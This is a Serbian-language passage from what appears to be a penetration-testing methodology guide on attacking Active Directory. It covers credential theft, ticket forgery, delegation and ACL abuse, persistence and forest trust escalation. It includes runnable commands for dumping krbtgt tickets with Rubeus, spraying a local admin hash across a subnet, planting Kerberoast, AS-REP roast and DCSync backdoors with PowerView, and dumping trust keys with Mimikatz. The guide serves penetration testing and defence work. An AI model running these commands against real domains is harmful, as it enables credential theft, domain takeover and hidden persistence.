Kada pribaviš neke credentials, možeš proveriti da li imaš pristup nekom **računaru**. U tu svrhu možeš da koristiš **CrackMapExec** za pokušaj povezivanja sa više servera putem različitih protokola, u skladu sa skeniranjem portova.

### Lokalna eskalacija privilegija

Ako si kompromitovao credentials ili sesiju običnog korisnika domena i možeš da pristupiš **bilo kom računaru u domenu**, potraži put za **lokalnu eskalaciju privilegija i prikupljanje credentials**. Lokalne administratorske privilegije mogu ti omogućiti da **izvučeš hash-eve drugih korisnika** iz memorije (LSASS) i lokalnog skladišta (SAM).

U ovoj knjizi postoji cela stranica o [**lokalnoj eskalaciji privilegija u Windowsu**](../windows-local-privilege-escalation/index.html) i [**kontrolna lista**](../checklist-windows-privilege-escalation.md). Takođe, ne zaboravi da koristiš [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Karte trenutne sesije

**Malo je verovatno** da ćeš pronaći **karte** u trenutnom korisniku koje ti **daju dozvolu za pristup** neočekivanim resursima, ali možeš proveriti:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Sa domenским akreditivima ili korisničkom sesijom, ponovo razmotrite NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): tehnike enumeracije i prinude nakon autentifikacije mogu otkriti putanje za relay koje nisu bile dostupne tokom izviđanja bez autentifikacije.

### Pronalaženje Creds u računarskim deljenim resursima | SMB Shares

Sada kada imate neke osnovne akreditive, proverite da li možete da **pronađete** neke **zanimljive datoteke koje se dele unutar AD-a**. To možete da uradite ručno, ali je to veoma dosadan i repetitivan zadatak (naročito ako pronađete stotine dokumenata koje treba da proverite).

[**Pratite ovu vezu da biste saznali koje alate možete da koristite.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Krađa NTLM Creds

Ako možete da **pristupite drugim računarima ili deljenim resursima**, možete da **postavite datoteke** (kao što je SCF datoteka) koje će, ako im neko pristupi, **pokrenuti NTLM autentifikaciju prema vama**, pa ćete moći da **ukradete** **NTLM challenge** i razbijete ga:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ova ranjivost je svakom autentifikovanom korisniku omogućavala da **kompromituje kontroler domena**.


{{#ref}}
printnightmare.md
{{#endref}}

## Eskalacija privilegija u Active Directory-ju SA privilegovanim akreditivima/sesijom

**Za sledeće tehnike nije dovoljan običan korisnik domena; potrebne su vam posebne privilegije/akreditivi za izvođenje ovih napada.**

### Ekstrakcija hash-eva

Nadamo se da ste uspeli da **kompromitujete neki nalog lokalnog administratora** koristeći [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), uključujući relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [lokalnu eskalaciju privilegija](../windows-local-privilege-escalation/index.html).\
Zatim je vreme da izvadite sve hash-eve iz memorije i sa lokalnog sistema.\
[**Pročitajte ovu stranicu o različitim načinima pribavljanja hash-eva.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Kada dobijete hash korisnika**, možete da ga iskoristite da biste se **predstavili kao taj korisnik**.\
Potrebno je da koristite neki **alat** koji će **obaviti** **NTLM autentifikaciju koristeći** taj **hash**, **ili** možete da kreirate novu **sessionlogon** sesiju i **ubacite** taj **hash** u **LSASS**, tako da se taj **hash koristi pri svakom obavljanju NTLM autentifikacije.** To je ono što radi mimikatz.\
[**Pročitajte ovu stranicu za više informacija.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ovaj napad ima za cilj da **iskoristi NTLM hash korisnika za zahtevanje Kerberos tiketa**, kao alternativu uobičajenom Pass The Hash napadu preko NTLM protokola. Zato može biti naročito **koristan u mrežama u kojima je NTLM protokol onemogućen**, a za autentifikaciju je dozvoljen samo **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

U metodi napada **Pass The Ticket (PTT)**, napadači **kradu korisnički autentifikacioni tiket** umesto lozinke ili hash vrednosti. Ovaj ukradeni tiket se zatim koristi za **predstavljanje tog korisnika**, čime se stiče neovlašćen pristup resursima i servisima unutar mreže.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Ponovna upotreba akreditiva

Ako imate **hash** ili **lozinku** **lokalnog administratora**, pokušajte da se pomoću njih **lokalno prijavite** na druge **računare**.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Imajte na umu da je ovo prilično **noisy** i da bi **LAPS** to **mitigate**.

### Zloupotreba MSSQL-a i pouzdanih veza

Ako korisnik ima privilegije za **pristup MSSQL instancama**, možda će moći da **izvršava komande** na MSSQL hostu (ako se izvršava kao SA), **ukrade** NetNTLM **hash** ili čak izvede **relay** **attack**.\
Ako je MSSQL instanca povezana sa drugom instancom preko pouzdane veze baze podataka, korisnik sa privilegijama nad povezanom bazom možda će moći da **iskoristi odnos poverenja za izvršavanje upita na drugoj instanci**. Ovi odnosi poverenja mogu se ulančavati i na kraju dovesti do pogrešno konfigurisane baze podataka na kojoj korisnik može da izvršava komande.\
**Veze između baza podataka funkcionišu čak i preko forest trust-ova.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Zloupotreba platformi za IT inventar i deployment

Paketi nezavisnih proizvođača za inventar i deployment često omogućavaju moćne načine za pristupanje kredencijalima i izvršavanje koda. Pogledajte:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ako pronađete bilo koji Computer objekat sa atributom [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i imate domenske privilegije na tom računaru, moći ćete da iz memorije izvučete TGT-ove svih korisnika koji se prijave na računar.\
Dakle, ako se **Domain Admin prijavi na računar**, moći ćete da izvučete njegov TGT i da se predstavljate kao on koristeći [Pass the Ticket](pass-the-ticket.md).\
Zahvaljujući constrained delegation-u, mogli biste čak i **automatski da kompromitujete Print Server** (nadamo se da će to biti DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ako je korisniku ili računaru dozvoljen „Constrained Delegation“, moći će da se **predstavlja kao bilo koji korisnik radi pristupa određenim servisima na računaru**.\
Zatim, ako **kompromitujete hash** tog korisnika/računara, moći ćete da se **predstavljate kao bilo koji korisnik** (čak i kao domain admin) radi pristupa određenim servisima.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Ako imate privilegiju **WRITE** nad Active Directory objektom udaljenog računara, možete da postignete izvršavanje koda sa **povišenim privilegijama**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Zloupotreba dozvola/ACL-ova

Kompromitovani korisnik može imati **zanimljive privilegije nad određenim domenskim objektima**, što bi vam moglo omogućiti kasnije **lateralno kretanje**/**eskalaciju** privilegija.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Zloupotreba usluge Printer Spooler

Otkrivanje **Spool usluge koja osluškuje** unutar domena može se **zloupotrebiti** za **prikupljanje novih kredencijala** i **eskalaciju privilegija**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Zloupotreba sesija trećih strana

Ako **drugi korisnici** **pristupe** **kompromitovanoj** mašini, moguće je **prikupiti kredencijale iz memorije**, pa čak i **ubaciti beacone u njihove procese** radi lažnog predstavljanja.\
Korisnici obično pristupaju sistemu putem RDP-a, pa ovde možete videti kako da izvedete nekoliko napada na RDP sesije trećih strana:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** omogućava upravljanje **lozinkom lokalnog Administrator naloga** na računarima pridruženim domenu, uz obezbeđivanje da ona bude **nasumična**, jedinstvena i često **menjana**. Te lozinke čuvaju se u Active Directory-ju, a pristup njima se pomoću ACL-ova ograničava isključivo na ovlašćene korisnike. Uz dovoljne dozvole za pristup tim lozinkama, moguće je preći na druge računare.


{{#ref}}
laps.md
{{#endref}}

### Krađa sertifikata

Informacije o AD CS registraciji, mapiranju sertifikata i enumeraciji pre nego što krenete sa krađom sertifikata ili zloupotrebom template-a potražite u [pregledu AD sertifikata](ad-certificates.md).

**Prikupljanje sertifikata** sa kompromitovane mašine može biti način za eskalaciju privilegija u okruženju:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Zloupotreba template-a sertifikata

Ako su konfigurisani **ranjivi template-i**, moguće ih je zloupotrebiti za eskalaciju privilegija:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation sa nalogom visokih privilegija

### Izvlačenje domenskih kredencijala

Kada steknete privilegije **Domain Admin** ili, još bolje, **Enterprise Admin**, možete da **izvučete** **domensku bazu podataka**: _ntds.dit_.

[**Više informacija o DCSync attack-u možete pronaći ovde**](dcsync.md).

[**Više informacija o krađi datoteke NTDS.dit možete pronaći ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Čitljivu arhivu rezervne kopije koja sadrži `ntds.dit` zajedno sa hive-om `SYSTEM` treba smatrati izloženim materijalom direktorijuma čak i pre raspakivanja. Zastareo password hash ne znači da su drugi atributi objekta bezbedni: polja kao što je `description` mogu sadržati kredencijale ili operativne napomene. Najpre pregledajte nazive članova arhive i nemojte uključivati raspakovani sadržaj baze podataka u uobičajeni izlaz enumeracije.

### Privesc kao persistence

Neke od prethodno razmatranih tehnika mogu se koristiti za persistence.\
Na primer, možete:

- Učiniti korisnike ranjivim na [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Učinite korisnike ranjivim na [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Dodelite korisniku privilegije [**DCSync**](#dcsync)

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack** kreira legitiman **Ticket Granting Service (TGS) ticket** za određenu uslugu koristeći **NTLM hash** (na primer, **hash PC naloga**). Ova metoda se koristi za **pristup privilegijama usluge**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** podrazumeva da napadač pribavi **NTLM hash krbtgt naloga** u Active Directory (AD) okruženju. Ovaj nalog je poseban jer se koristi za potpisivanje svih **Ticket Granting Tickets (TGTs)**, koji su neophodni za autentifikaciju unutar AD mreže.

Kada pribavi ovaj hash, napadač može da kreira **TGTs** za bilo koji nalog koji odabere (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Oni su nalik golden tickets, ali su falsifikovani tako da **zaobilaze uobičajene mehanizme za otkrivanje golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence pomoću Certificates naloga**

**Posedovanje certificates naloga ili mogućnost njihovog zahtevanja** veoma je dobar način da se održi persistence u korisničkom nalogu (čak i ako korisnik promeni lozinku):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence pomoću Certificates domena**

**Certificates se mogu koristiti i za održavanje persistence-a uz visoke privilegije unutar domena:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Objekat **AdminSDHolder** u Active Directory obezbeđuje zaštitu **privilegovanih grupa** (kao što su Domain Admins i Enterprise Admins) primenom standardne **Access Control List (ACL)** na te grupe, čime sprečava neovlašćene izmene. Međutim, ova funkcija može da se zloupotrebi: ako napadač izmeni ACL objekta AdminSDHolder tako da običan korisnik dobije pun pristup, taj korisnik stiče široku kontrolu nad svim privilegovanim grupama. Tako ova bezbednosna mera, namenjena zaštiti, može da ima suprotan efekat i omogući neovlašćen pristup ako se pažljivo ne nadgleda.

[**Više informacija o AdminDSHolder Group možete pronaći ovde.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Na svakom **Domain Controller (DC)** računaru postoji nalog **lokalnog administratora**. Ako na takvom računaru dobijete administratorska prava, hash lokalnog Administrator naloga može se izdvojiti pomoću **mimikatz**. Zatim je potrebno izmeniti registry да biste **omogućili korišćenje ove lozinke**, što omogućava udaljeni pristup lokalnom Administrator nalogu.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Možete da dodelite korisniku određene **posebne dozvole** nad konkretnim objektima domena, što će mu omogućiti da **u budućnosti eskalira privilegije**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** se koriste za čuvanje **dozvola** koje **objekat** ima **nad** drugim **objektom**. Ako možete da unesete samo **malu izmenu** u **security descriptor** nekog objekta, možete da steknete veoma zanimljive privilegije nad tim objektom, bez potrebe da budete član privilegovane grupe.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Zloupotrebite pomoćnu klasu `dynamicObject` da biste kreirali kratkotrajne principals/GPOs/DNS zapise pomoću `entryTTL`/`msDS-Entry-Time-To-Die`; oni se sami brišu bez tombstones, uklanjajući LDAP dokaze, ali ostavljajući za sobom orphan SIDs, neispravne reference `gPLink` ili keširane DNS odgovore (npr. zagađenje ACE-a u AdminSDHolder-u ili zlonamerna preusmeravanja `gPCFileSysPath`/AD-integrated DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Izmenite **LSASS** u memoriji da biste postavili **univerzalnu lozinku**, koja omogućava pristup svim nalozima domena.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Ovde saznajte šta je SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Možete da kreirate **sopstveni SSP** za **hvatanje** **credentials** podataka u **čistom tekstu**, koji se koriste za pristup računaru.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registruje **novi Domain Controller** u AD-u i koristi ga za **slanje atributa** (SIDHistory, SPNs...) na navedene objekte, **bez** ostavljanja bilo kakvih **logova** o **izmenama**. Potrebne su vam privilegije **DA**, a morate biti i unutar **root domain**-a.\
Imajte na umu da će se pojaviti prilično ružni logovi ako koristite pogrešne podatke.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Ranije smo govorili o tome kako da eskalirate privilegije ako imate **dovoljno dozvola za čitanje LAPS lozinki**. Međutim, ove lozinke mogu da se koriste i za **održavanje persistence-a**.\
Pogledajte:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft smatra da je **Forest** bezbednosna granica. To znači da **kompromitovanje jednog domena može potencijalno dovesti do kompromitovanja celog Forest-a**.<sup>[[1]](#references)</sup>

### Osnovne informacije

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) je bezbednosni mehanizam koji korisniku iz jednog **domena** omogućava pristup resursima u drugom **domenu**. U suštini, on povezuje sisteme za autentifikaciju dva domena, omogućavajući da se provere autentifikacije nesmetano odvijaju. Kada domeni uspostave trust, razmenjuju i čuvaju određene **ključeve** na svojim **Domain Controllers (DCs)**, koji su ključni za integritet trust-a.

U tipičnom scenariju, ako korisnik želi da pristupi usluzi u **trusted domain**-u, prvo mora da zatraži poseban ticket, poznat kao **inter-realm TGT**, od DC-a svog domena. Ovaj TGT je šifrovan zajedničkim **ključem** о kome su se oba domena dogovorila. Zatim korisnik предаје ovaj TGT **DC-u trusted domain**-a da bi dobio service ticket (**TGS**). Kada DC trusted domain-a uspešno proveri inter-realm TGT, izdaje TGS koji korisniku omogućava pristup usluzi.

**Koraci**:

1. **Klijentski računar** u **Domain 1** pokreće proces koristeći svoj **NTLM hash** da bi zatražio **Ticket Granting Ticket (TGT)** od svog **Domain Controller (DC1)**.
2. DC1 izdaje novi TGT ako je autentifikacija klijenta uspešna.
3. Zatim klijent od DC1 traži **inter-realm TGT**, koji je potreban za pristup resursima u **Domain 2**.
4. Inter-realm TGT je šifrovan pomoću **trust key**-a koji DC1 i DC2 dele u okviru dvosmernog domain trust-а.
5. Klijent prenosi inter-realm TGT na **Domain Controller (DC2) domena 2**.
6. DC2 proverava inter-realm TGT pomoću zajedničkog trust key-а i, ako je validan, izdaje **Ticket Granting Service (TGS)** za server u Domain 2 kome klijent želi da pristupi.
7. Na kraju, klijent predaje ovaj TGS serveru. TGS je šifrovan hash-om serverovog naloga i omogućava pristup usluzi u Domain 2.

### Različiti trust-ovi

Važno je napomenuti da **trust može biti jednosmeran ili dvosmeran**. U dvosmernom odnosu, oba domena veruju jedan drugom, dok je u **jednosmernom** odnosu jedan domen **trusted**, a drugi **trusting** domen. U ovom drugom slučaju, **resursima u trusting domenu moći ćete da pristupite samo iz trusted domena**.

Ako Domain A veruje Domain B, A je trusting domain, a B je trusted domain. Pored toga, u **Domain A** to bi bio **Outbound trust**, a u **Domain B** **Inbound trust**.

**Različiti odnosi trust-a**

- **Parent-Child Trusts**: Ovo je uobičajena postavka unutar istog forest-a, gde child domain automatski ima dvosmerni transitive trust sa svojim parent domain-om. To u suštini znači da zahtevi za autentifikaciju mogu nesmetano da se prosleđuju između parent i child domena.
- **Cross-link Trusts**: Poznati i kao „shortcut trusts“, uspostavljaju se između child domena radi ubrzavanja procesa prosleđivanja zahteva. U složenim forest-ima, zahtevi za prosleđivanje autentifikacije obično moraju da putuju do forest root-a, a zatim do ciljnog domena. Uspostavljanjem cross-link-ova skraćuje se putanja, što je naročito korisno u geografski rasprostranjenim okruženjima.
- **External Trusts**: Uspostavljaju se između različitih, nepovezanih domena i po prirodi nisu transitive. Prema [Microsoft dokumentaciji](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts su korisni za pristup resursima u domenu izvan trenutnog forest-a koji nije povezan forest trust-om. SID filtering povećava bezbednost external trusts-a.
- **Tree-root Trusts**: Ovi trust-ovi se automatski uspostavljaju između forest root domena i novog tree root-a. Iako se ne sreću često, tree-root trust-ovi su važni za dodavanje novih domain tree-ova u forest, jer im omogućavaju da zadrže jedinstveno ime domena i obezbeđuju dvosmernu transitivity. Više informacija potražite u [Microsoft vodiču](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ovaj tip trust-а predstavlja dvosmerni transitive trust između dva forest root domena, uz primenu SID filtering-a radi poboljšanja bezbednosti.
- **MIT Trusts**: Ovi trust-ovi se uspostavljaju sa Kerberos domenima koji nisu Windows i usaglašeni su sa [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trust-ovi su nešto specijalizovaniji i namenjeni su okruženjima koja zahtevaju integraciju sa sistemima zasnovanim na Kerberos-u izvan Windows ekosistema.

#### Druge razlike u **odnosima trust-a**

- Odnos trust-а može biti i **transitive** (A veruje B-u, B veruje C-u, pa A veruje C-u) ili **non-transitive**.
- Odnos trust-а može biti uspostavljen kao **bidirectional trust** (oba domena veruju jedan drugom) ili **one-way trust** (samo jedan domen veruje drugom).

### Putanja napada

1. **Enumerišite** odnose trust-а.
2. Proverite da li neki **security principal** (user/group/computer) ima **pristup** resursima **drugog domena**, možda preko ACE unosa ili članstva u grupama drugog domena. Potražite **odnose između domena** (verovatno je zbog toga trust i uspostavljen).
   1. U ovom slučaju, kerberoast može biti još jedna mogućnost.
3. **Kompromitujte** **naloge** koji mogu da se koriste za **pivot** između domena.

Napadači koji imaju pristup resursima u drugom domenu mogu da ga ostvare putem tri osnovna mehanizma:

- **Local Group Membership**: Principals mogu biti dodati u lokalne grupe na računarima, kao što je grupa „Administrators“ na serveru, čime dobijaju značajnu kontrolu nad tim računarom.
- **Foreign Domain Group Membership**: Principals mogu biti i članovi grupa u stranom domenu. Međutim, efikasnost ovog pristupa zavisi od vrste trust-а i opsega grupe.
- **Access Control Lists (ACLs)**: Principals mogu biti navedeni u **ACL**-u, naročito kao entiteti u okviru **ACEs** u **DACL**-u, čime im se omogućava pristup određenim resursima. Za detaljnije upoznavanje sa načinom rada ACLs, DACLs i ACEs, bela knjiga pod nazivom „[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)“ predstavlja dragocen izvor.<sup>[[17]](#references)</sup>

### Pronalaženje eksternih korisnika/grupa sa dozvolama

Možete da proverite **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** da biste pronašli foreign security principals u domenu. To će biti user/group nalozi iz **spoljnog domena/forest-а**.

To možete da proverite u **Bloodhound**-u ili pomoću powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Eskalacija privilegija iz podređene u nadređenu šumu

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Drugi načini za enumeraciju poverenja domena:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Postoje **2 ključa poverenja**, jedan za _Child --> Parent_, a drugi za _Parent_ --> _Child_.\
> Možete pronaći onaj koji koristi trenutni domen pomoću:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskalirajte do Enterprise admin u child/parent domenu zloupotrebom trust-a pomoću SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Razumevanje načina na koji se Configuration Naming Context (NC) može iskoristiti je ključno. Configuration NC služi kao centralno skladište konfiguracionih podataka u Active Directory (AD) okruženjima, na nivou celog forest-a. Ovi podaci se repliciraju na svaki Domain Controller (DC) unutar forest-a, a writable DC-ovi održavaju writable kopiju Configuration NC-a. Da bi se ovo iskoristilo, potrebno je imati **SYSTEM privilegije na DC-u**, po mogućnosti child DC-u.

**Povezivanje GPO-a sa root DC sajtom**

Sites kontejner u okviru Configuration NC-a sadrži informacije o sajtovima svih računara pridruženih domenu u AD forest-u. Radeći sa SYSTEM privilegijama na bilo kom DC-u, napadači mogu da povežu GPO-ove sa root DC sajtovima. Ova radnja potencijalno ugrožava root domen manipulisanjem pravilima koja se primenjuju na te sajtove.

Za detaljnije informacije možete istražiti istraživanje o [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Kompromitovanje bilo kog gMSA-a u forest-u**

Jedan od vektora napada je ciljanje privilegovanih gMSA naloga u domenu. KDS Root key, neophodan za izračunavanje lozinki gMSA naloga, čuva se u Configuration NC-u. Sa SYSTEM privilegijama na bilo kom DC-u, moguće je pristupiti KDS Root key-u i izračunati lozinke za bilo koji gMSA u forest-u.

Detaljnu analizu i uputstva korak po korak možete pronaći u:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Komplementarni napad na delegirani MSA (BadSuccessor – zloupotreba atributa za migraciju):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatno eksterno istraživanje: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Ova metoda zahteva strpljenje, jer je potrebno sačekati da se kreiraju novi privilegovani AD objekti. Sa SYSTEM privilegijama, napadač može da izmeni AD Schema tako da bilo kom korisniku dodeli potpunu kontrolu nad svim klasama. To može dovesti do neovlašćenog pristupa novokreiranim AD objektima i kontrole nad njima.

Dodatne informacije dostupne su u tekstu [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Od DA do EA uz ADCS ESC5**

Ranjivost ADCS ESC5 cilja kontrolu nad objektima Public Key Infrastructure (PKI), kako bi se kreirao certificate template koji omogućava autentifikaciju kao bilo koji korisnik u forest-u. Pošto se PKI objekti nalaze u Configuration NC-u, kompromitovanje writable child DC-a omogućava izvođenje ESC5 napada.

Više detalja možete pronaći u tekstu [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> U okruženjima bez ADCS-a napadač može da podesi neophodne komponente, kao što je objašnjeno u tekstu [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Spoljni forest domen - jednosmerni (dolazni) ili dvosmerni

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

U ovom scenariju eksterni domen veruje vašem domenu, dajući mu neodređene dozvole nad eksternim domenom. Moraćete da utvrdite koji principi iz vašeg domena imaju pristup eksternom domenu i koji nivo pristupa imaju, a zatim da pokušate da to iskoristite:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterni domen šume - jednosmerni (Outbound)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

U ovom scenariju **vaš domen** **ukazuje poverenje** tako što poverava određene **privilegije** principalu iz **drugog domena**.

Međutim, kada **domen koji ukazuje poverenje** uspostavi poverenje u drugi domen, domen kojem se ukazuje poverenje **kreira korisnika** sa **predvidljivim imenom** i koristi **lozinku za poverenje** kao lozinku tog korisnika. To znači da je moguće **pristupiti korisniku iz domena koji ukazuje poverenje i ući u domen kojem se ukazuje poverenje**, kako biste ga enumerisali i pokušali da eskalirate privilegije:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Drugi način za kompromitovanje domena kojem se ukazuje poverenje jeste da pronađete [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) kreiran u **suprotnom smeru** od poverenja između domena (što nije naročito često).

Drugi način za kompromitovanje domena kojem se ukazuje poverenje jeste da sačekate na mašini kojoj **korisnik iz domena kojem se ukazuje poverenje može da pristupi** i da se prijavi putem **RDP-a**. Zatim bi napadač mogao da ubaci kod u proces RDP sesije i odatle **pristupi izvornom domenu žrtve**.\
Pored toga, ako je **žrtva montirala svoj čvrsti disk**, napadač bi mogao da sačuva **backdoor-e** u **startup folderu čvrstog diska** iz procesa **RDP sesije**. Ova tehnika se zove **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Ublažavanje zloupotrebe poverenja između domena

### **SID Filtering:**

- Rizik od napada koji koriste atribut SID history preko poverenja između šuma ublažava se pomoću SID Filtering-a, koji je podrazumevano aktiviran na svim poverenjima između šuma. Ovo se zasniva na pretpostavci da su poverenja unutar šuma bezbedna, pri čemu se, prema stavu Microsofta, šuma smatra bezbednosnom granicom, a ne domen.
- Međutim, postoji začkoljica: SID filtering može da ometa aplikacije i pristup korisnika, pa se ponekad deaktivira.

### **Selective Authentication:**

- Kod poverenja između šuma, korišćenjem Selective Authentication-a osigurava se da se korisnici iz dva šuma ne autentifikuju automatski. Umesto toga, potrebne su eksplicitne dozvole da bi korisnici mogli da pristupe domenima i serverima unutar domena ili šuma koji ukazuje poverenje.
- Važno je napomenuti da ove mere ne štite od iskorišćavanja upisivog Configuration Naming Context-a (NC) niti od napada na nalog poverenja.

[**Više informacija o poverenjima između domena na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Zloupotreba AD-a zasnovana na LDAP-u pomoću implantata na hostu

